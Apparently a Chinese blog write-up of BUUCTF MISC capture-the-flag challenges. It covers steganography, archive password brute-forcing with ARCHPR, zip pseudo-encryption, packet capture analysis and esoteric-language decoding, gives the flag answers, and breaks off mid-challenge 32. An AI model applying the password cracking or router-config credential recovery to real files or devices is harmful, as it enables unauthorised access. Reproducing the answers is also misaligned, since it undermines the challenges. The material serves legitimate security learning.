    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>MISC杂项的学习。</p><span id="more"></span><h1 id="1-签到题"><a href="#1-签到题" class="headerlink" title="1 - 签到题"></a>1 - 签到题</h1><p>加buuctf的qq群，没加进去…</p><h1 id="2-金三胖"><a href="#2-金三胖" class="headerlink" title="2 - 金三胖"></a>2 - 金三胖</h1><p>打开下载的压缩包文件，是一个gif<br>打开gif，发现一闪而过的flag<br>用potplayer逐帧播放，成功拿到flag<br><code>flag&#123;he11ohongke&#125;</code></p><h1 id="3-你竟然赶我走"><a href="#3-你竟然赶我走" class="headerlink" title="3 - 你竟然赶我走"></a>3 - 你竟然赶我走</h1><p>打开下载的压缩包文件，是一个jpg<br>打开jpg无明显特征<br>使用notepad++插件 Hex-Editor 查看16进制文件<br>然后发现在jpg的文件尾 <code>FF D9</code> 后还有一些额外的16进制数据，查看发现flag<br><code>flag&#123;stego_is_s0_bor1ing&#125;</code></p><h1 id="4-二维码"><a href="#4-二维码" class="headerlink" title="4 - 二维码"></a>4 - 二维码</h1><p>打开下载的压缩包文件，是一个二维码<br>kali下使用binwalk工具，发现二维码中隐藏了一个zip文件，于是使用foremost工具分离二维码。<br>得到zip，解压需要知道密码。通过ARCHPR软件破解密码，直接使用数字暴力破解即可。密码是7639<br>解压得到txt文件，读取flag。<br><code>flag&#123;vjpw_wnoei&#125;</code></p><h1 id="5-大白"><a href="#5-大白" class="headerlink" title="5 - 大白"></a>5 - 大白</h1><p>打开下载的压缩包文件，是一个png<br>根据题目提示，尝试修改题目的宽高<br>在第17-20字节之间是图片的长，第21-24字节之间是图片的高。<br>修改图片的高，其实就是增大16进制的值，拿到隐藏的部分flag<br><code>flag&#123;He1l0_d4_ba1&#125;</code></p><h1 id="6-N种方法解决"><a href="#6-N种方法解决" class="headerlink" title="6 - N种方法解决"></a>6 - N种方法解决</h1><p>打开下载的压缩包文件，是一个exe<br>点击无法运行。<br>于是用010editor工具打开，发现一个data输出流：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:image/jpg;base64,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</span><br></pre></td></tr></table></figure><p>直接在浏览器中打开，发现是一张二维码。<br>使用微信扫二维码，得到：<br><code>KEY&#123;dca57f966e4e4e31fd5b15417da63269&#125;</code><br>将KEY改为flag，提交成功<br><code>flag&#123;dca57f966e4e4e31fd5b15417da63269&#125;</code></p><h1 id="7-乌镇峰会种图"><a href="#7-乌镇峰会种图" class="headerlink" title="7 - 乌镇峰会种图"></a>7 - 乌镇峰会种图</h1><p>打开下载的jpg图片，比较模糊。<br>查看属性，没有收获。<br>使用010editor工具打开jpg图片<br>搜索flag，得到：<br><code>flag&#123;97314e7864a8f62627b26f3f998c37f1&#125;</code></p><h1 id="8-wireshark"><a href="#8-wireshark" class="headerlink" title="8 - wireshark"></a>8 - wireshark</h1><p>通过题目可知，需要通过wireshark进行流量分析，找到密码。<br>那么打开wireshark，直接搜索login，找到第一个POST界面。基本就是登录时输入密码的流量包。<br>然后就得到POST数据：<br><code>email=flag&amp;password=ffb7567a1d4f4abdffdb54e022f8facd&amp;captcha=BYUG</code><br>由于密码即为flag，那么直接：<br><code>flag&#123;ffb7567a1d4f4abdffdb54e022f8facd&#125;</code></p><h1 id="9-基础破解"><a href="#9-基础破解" class="headerlink" title="9 - 基础破解"></a>9 - 基础破解</h1><p>打开下载的压缩包文件，得到一个rar<br>根据题目提示，需要破解四位数字密码加密的rar文件才能获得flag信息。<br>于是使用ARCHPR工具进行暴力破解<br>得到密码2563<br>然后解密，得到flag.txt文件，打开是一个base64加密的字符串。<br>使用base64解密，得到：<br><code>flag&#123;70354300a5100ba78068805661b93a5c&#125;</code></p><h1 id="10-文件中的秘密"><a href="#10-文件中的秘密" class="headerlink" title="10 - 文件中的秘密"></a>10 - 文件中的秘密</h1><p>打开下载的压缩包文件，得到一个jpeg<br>正常方式打开jpeg，没有发现特别的东西。<br>使用010editor工具搜索flag，也没有发现。<br>打开文件property，发现comments有flag：<br><code>flag&#123;870c5a72806115cb5439345d8b014396&#125;</code></p><h1 id="11-LSB"><a href="#11-LSB" class="headerlink" title="11 - LSB"></a>11 - LSB</h1><p>打开下载的压缩包文件，得到一个png<br>根据题目提示的LSB，那么可以使用Stegsolve工具和zsteg工具。<br>首先尝试了zsteg工具，在github上clone文件。然后需要下载安装ruby语言环境，然后通过 <code>gem install zsteg</code> 安装zsteg<br>但是安装完成后使用，出现了报错，简单查询后无法解决，于是放弃。<br>接下来尝试了Stegsolve工具，通过网上的搜索下载到jar。<br>该工具需要Java环境，由于我已经安装Java，所以直接打开jar文件，然后将图片放上去。<br>接下来变换RGB通道，发现在Red plane 0, Green plane 0, Blue plane 0通道发现图片上方有东西。<br>于是通过 Analyse -&gt; Data Extract<br>在Bit Planes一栏，将Red，Green和Blue均改为0，同时在Bit Order一栏调为LSB First，其它不变。<br>最终生成了名为flag.png的二维码。</p><p>接下来使用QR Research工具，解码数据得到：<br><code>cumtctf&#123;1sb_i4_s0_Ea4y&#125;</code><br>修改为答案格式：<br><code>flag&#123;1sb_i4_s0_Ea4y&#125;</code></p><h1 id="12-zip伪加密"><a href="#12-zip伪加密" class="headerlink" title="12 - zip伪加密"></a>12 - zip伪加密</h1><p>下载压缩包文件，发现无法打开，提示需要输入密码。<br>根据题目提示zip伪加密，了解了zip伪加密的知识。<br>简单来说，就是zip文件本身没有加密，但是修改了全局方式位标记从 <code>00 00</code> 变为 <code>09 00</code> ，就会被判定为加密的zip文件。<br>我们只需要将16进制修改为 <code>00 00</code> 即可。（注意压缩源文件数据区和压缩源文件目录区的标记都要修改）<br>成功解压缩得到flag.txt<br>得到flag：<br><code>flag&#123;Adm1N-B2G-kU-SZIP&#125;</code></p><h1 id="13-被嗅探的流量"><a href="#13-被嗅探的流量" class="headerlink" title="13 - 被嗅探的流量"></a>13 - 被嗅探的流量</h1><p>打开下载的压缩包文件，是一个wireshark相关文件，使用wireshark打开，分析流量。<br>重点查找GET，POST upload file的关键词部分，最终在 <code>POST /upload.php HTTP/1.1</code> 处，通过查看16进制数据，找到flag（不能复制有点离谱）<br><code>flag&#123;da73d88936010da1eeeb36e945ec4b97&#125;</code></p><h1 id="14-rar"><a href="#14-rar" class="headerlink" title="14 - rar"></a>14 - rar</h1><p>打开下载的压缩包文件，是一个rar<br>需要输入4位纯数字的密码</p><p>和之前的方式相同，使用ARCHPR破解。<br>得到flag：<br><code>flag&#123;1773c5da790bd3caff38e3decd180eb7&#125;</code></p><h1 id="15-qr"><a href="#15-qr" class="headerlink" title="15 - qr"></a>15 - qr</h1><p>打开下载的二维码图片，使用QR Research工具，得到：<br><code>flag&#123;878865ce73370a4ce607d21ca01b5e59&#125;</code></p><h1 id="16-镜子里面的世界"><a href="#16-镜子里面的世界" class="headerlink" title="16 - 镜子里面的世界"></a>16 - 镜子里面的世界</h1><p>打开下载的压缩包文件，是一个png<br>查看文件属性，原图片，原图片的16进制均无法得到flag<br>于是通过Stegsolve工具，变换RGB通道，发现在Red plane 0, Green plane 0, Blue plane 0通道发现图片上方有东西。<br>于是通过 Analyse -&gt; Data Extract<br>在Bit Planes一栏，将Red，Green和Blue均改为0，同时在Bit Order一栏调为LSB First，其它不变。<br>得到flag.png文件，文件无法通过普通方式打开，使用010Editor打开，发现flag值：<br><code>flag&#123;st3g0_saurus_wr3cks&#125;</code></p><h1 id="17-ningen"><a href="#17-ningen" class="headerlink" title="17 - ningen"></a>17 - ningen</h1><p>打开下载的文件，是一个png<br>根据题目提示信息，可推测有文件附加<br>于是使用foremost分离文件，得到zip<br>4位纯数字解密，使用ARCHPR工具，解压得到：<br><code>flag&#123;b025fc9ca797a67d2103bfbc407a6d5f&#125;</code></p><h1 id="18-小明的保险箱"><a href="#18-小明的保险箱" class="headerlink" title="18 - 小明的保险箱"></a>18 - 小明的保险箱</h1><p>解法和17题一模一样。</p><h1 id="19-爱因斯坦"><a href="#19-爱因斯坦" class="headerlink" title="19 - 爱因斯坦"></a>19 - 爱因斯坦</h1><p>解法和17题基本一致，唯一的区别在于，zip文件的密码在属性中找到。<br><code>flag&#123;dd22a92bf2cceb6c0cd0d6b83ff51606&#125;</code></p><h1 id="20-easycap"><a href="#20-easycap" class="headerlink" title="20 - easycap"></a>20 - easycap</h1><p>打开下载的文件，是一个pcap文件<br>使用wireshark打开，发现全是TCP包，那么直接追踪流量，使用 <code>Anaylze -&gt; Follow TCP Stream</code><br>直接得到flag<br><code>FLAG:385b87afc8671dee07550290d16a8071</code><br>更改为标准格式：<br><code>flag&#123;385b87afc8671dee07550290d16a8071&#125;</code></p><h1 id="21-隐藏的钥匙"><a href="#21-隐藏的钥匙" class="headerlink" title="21 - 隐藏的钥匙"></a>21 - 隐藏的钥匙</h1><p>打开下载的文件，是一个jpg<br>直接使用010editor，搜索flag，得到：<br><code>flag:base64:(Mzc3Y2JhZGRhMWVjYTJmMmY3M2QzNjI3Nzc4MWYwMGE=)</code><br>base64解密：<br><code>377cbadda1eca2f2f73d36277781f00a</code><br>整理为flag格式：<br><code>flag&#123;377cbadda1eca2f2f73d36277781f00a&#125;</code></p><h1 id="22-另外一个世界"><a href="#22-另外一个世界" class="headerlink" title="22 - 另外一个世界"></a>22 - 另外一个世界</h1><p>打开下载的文件，是一个jpg<br>直接使用010editor，搜索flag，没有找到<br>然后翻到最底部，发现有一串二进制，将二进制转换为字符串： <code>koekj3s</code><br>整理为flag格式：<br><code>flag&#123;koekj3s&#125;</code></p><h1 id="23-FLAG"><a href="#23-FLAG" class="headerlink" title="23 - FLAG"></a>23 - FLAG</h1><p>打开下载的文件，是一个png<br>使用pngcheck工具：<br><code>pngcheck.win64.exe -v 42.png</code><br>得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">File: 42.png (383781 bytes)</span><br><span class="line">  chunk IHDR at offset 0x0000c, length 13</span><br><span class="line">    664 x 586 image, 24-bit RGB, non-interlaced</span><br><span class="line">  chunk IDAT at offset 0x00025, length 65536</span><br><span class="line">    zlib: deflated, 32K window, default compression</span><br><span class="line">  chunk IDAT at offset 0x10031, length 65536</span><br><span class="line">  chunk IDAT at offset 0x2003d, length 65536</span><br><span class="line">  chunk IDAT at offset 0x30049, length 65536</span><br><span class="line">  chunk IDAT at offset 0x40055, length 65536</span><br><span class="line">  chunk IDAT at offset 0x50061, length 55984</span><br><span class="line">  chunk IEND at offset 0x5db1d, length 0</span><br><span class="line">No errors detected in 42.png (8 chunks, 67.1% compression).</span><br></pre></td></tr></table></figure><p>那么发现含有zlib<br>使用Stegsolve工具，将Red，Green，Blue调为0，选择Save Bin，保存为zip文件<br>尝试打开zip文件时发现文件损坏，随便找个文件修复工具进行修复。<br>得到修复后的zip，然后解压，得到1文件<br>使用010Editor工具打开，然后搜索hctf，得到flag：<br><code>flag&#123;dd0gf4c3tok3yb0ard4g41n~~~&#125;</code></p><h1 id="24-神秘龙卷风"><a href="#24-神秘龙卷风" class="headerlink" title="24 - 神秘龙卷风"></a>24 - 神秘龙卷风</h1><p>打开压缩文件，得到rar<br>4位数字使用ARCHPR爆破得到密码5463<br>解压出来得到txt文件，代码看不懂。<br>查了下是brainfuck代码，使用 <a href="https://bf.doleczek.pl/">这个网站</a> 将代码填入并运行，得到flag：<br><code>flag&#123;e4bbef8bdf9743f8bf5b727a9f6332a8&#125;</code></p><h1 id="25-数据包中的线索"><a href="#25-数据包中的线索" class="headerlink" title="25 - 数据包中的线索"></a>25 - 数据包中的线索</h1><p>打开压缩文件，得到pcapng，是wireshark文件。<br>通过wireshark打开pcapng文件，找到HTTP包，通过Follow HTTP Stream得到一个base64编码的数据。<br>将base64编码的数据保存为txt文件，然后使用<a href="https://www.base64decode.org/">在线网站</a>解码txt文件，可以直接得到一张图片，图片上就写了flag<br><code>flag&#123;209acebf6324a09671abc31c869de72c&#125;</code></p><h1 id="26-假如给我三天光明"><a href="#26-假如给我三天光明" class="headerlink" title="26 - 假如给我三天光明"></a>26 - 假如给我三天光明</h1><p>打开压缩文件，得到一个jpg和一个zip，zip有加密，里面是一个wav文件。<br>首先来看jpg，通过查看jpg，发现封面上的盲文。<br>那么搜索英文盲文对照表，可知封面的为盲文对应为英文字符应当为：<br><code>kmdonowg</code><br>猜测是zip的密码，尝试成功<br>打开wav音频文件，是莫斯电码(分析方法：自己听，也可用Audacity工具分析)：<br><code>-.-. - ..-. .-- .--. . .. ----- ---.. --... ...-- ..--- ..--.. ..--- ...-- -.. --..</code><br>得到的英文是：<br><code>CTFWPEI08732?23DZ</code><br>整理后为：<br><code>flag&#123;wpei08732?23dz&#125;</code></p><h1 id="27-后门查杀"><a href="#27-后门查杀" class="headerlink" title="27 - 后门查杀"></a>27 - 后门查杀</h1><p>打开压缩文件，得到一个html文件夹<br>根据题目描述，是一个网站的文件，需要找到后门文件的密码。<br>直接用杀毒软件(我用的火绒)对html文件夹进行查杀，得到密码<br><code>flag&#123;6ac45fb83b3bc355c024f5034b947dd3&#125;</code></p><h1 id="28-webshell后门"><a href="#28-webshell后门" class="headerlink" title="28 - webshell后门"></a>28 - webshell后门</h1><p>方法和27题相同</p><h1 id="29-来首歌吧"><a href="#29-来首歌吧" class="headerlink" title="29 - 来首歌吧"></a>29 - 来首歌吧</h1><p>打开压缩文件，得到一个wav<br>音频文件属性无信息，但是在听歌的过程中，发现了摩尔斯电码。<br>于是打开Audacity工具分析：<br>发现有两段音频，是混合在一起的。<br>那么分析那一段明显是莫尔斯电码的音频可以得到：<br><code>..... -... -.-. ----. ..--- ..... -.... ....- ----. -.-. -... ----- .---- ---.. ---.. ..-. ..... ..--- . -.... .---- --... -.. --... ----- ----. ..--- ----. .---- ----. .---- -.-.</code></p><p>解码整理得到：<br><code>flag&#123;5BC925649CB0188F52E617D70929191C&#125;</code></p><h1 id="30-荷兰宽带数据泄露"><a href="#30-荷兰宽带数据泄露" class="headerlink" title="30 - 荷兰宽带数据泄露"></a>30 - 荷兰宽带数据泄露</h1><p>打开压缩文件，得到一个conf.bin<br>搜索了一下，发现是一个路由器配置文件。<br>使用普通文件打开器显示乱码，于是下了一个路由器配置文件查看工具RouterPassView<br>使用该工具打开conf.bin，发现了配置信息。<br>然后通过配置信息找到了username和password</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;Username val=053700357621 /&gt;</span><br><span class="line">&lt;Password val=210265 /&gt;</span><br></pre></td></tr></table></figure><p>提交发现flag是username：<br><code>flag&#123;053700357621&#125;</code></p><h1 id="31-面具下的flag"><a href="#31-面具下的flag" class="headerlink" title="31 - 面具下的flag"></a>31 - 面具下的flag</h1><p>打开压缩文件，得到一个jpg<br>通过查看发现jpg中有一个vmdk文件，于是使用binwalk和foremost分离文件，得到了一个zip<br>zip文件显示需要输入密码，在没有得到密码提示信息时首先思考是否是伪加密。<br>于是打开010Editor工具搜索 <code>50 4B 01 02</code> ，后面的全局方式位标记 显示为 <code>09 00</code><br>将其修改为 <code>00 00</code> 再尝试解压，成功。<br>得到了一个vmdk文件，搜索得知vmdk文件是虚拟机文件。<br>Linux下使用7z命令解压：<br><code>7z x flag.vmdk -o./</code></p><p>得到了key_part_one和key_part_two目录<br>进入目录使用cat命令读取文件，分别得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- -.+++ +++.&lt;</span><br><span class="line">++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++++ +[-&gt;- ----- &lt;]&gt;-- ----- --.&lt;+ +++[- &gt;----</span><br><span class="line">&lt;]&gt;-- ----- .&lt;+++ [-&gt;++ +&lt;]&gt;+ +++++ .&lt;+++ +[-&gt;- ---&lt;] &gt;-.&lt;+ +++++ [-&gt;++</span><br><span class="line">++++&lt; ]&gt;+++ +++.&lt; +++++ [-&gt;-- ---&lt;] &gt;---- -.+++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----- .&lt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook?</span><br><span class="line">Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook!</span><br><span class="line">Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook.</span><br><span class="line">Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook?</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook.</span><br><span class="line">Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!</span><br><span class="line">Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook?</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook. Ook?</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook!</span><br><span class="line">Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook!</span><br><span class="line">Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.</span><br></pre></td></tr></table></figure><p>前者使用 <a href="https://bf.doleczek.pl/">BrainFuck</a> 可得到flag的前半部分：<br><code>flag&#123;N7F5_AD5</code><br>后者使用 <a href="https://www.splitbrain.org/services/ook">Brainfuck&#x2F;Ook!</a> 可得到flag的后半部分：<br><code>_i5_funny!&#125;</code></p><p>最终整理得到flag:<br><code>flag&#123;N7F5_AD5_i5_funny!&#125;</code></p><h1 id="32-九连环"><a href="#32-九连环" class="headerlink" title="32 - 九连环"></a>32 - 九连环</h1><p>打开压缩文件，得到一个jpg<br>通过010editor工具发现有zip<br>于是使用binwalk和foremost分离文件，得到一个zip<br>得到zip后发现有密码，爆破未果，猜测是伪密码。<br>定位到 <code>50 4B 01 02</code> 后4个字节的位置，有多个 <code>50 4B 01 02</code> 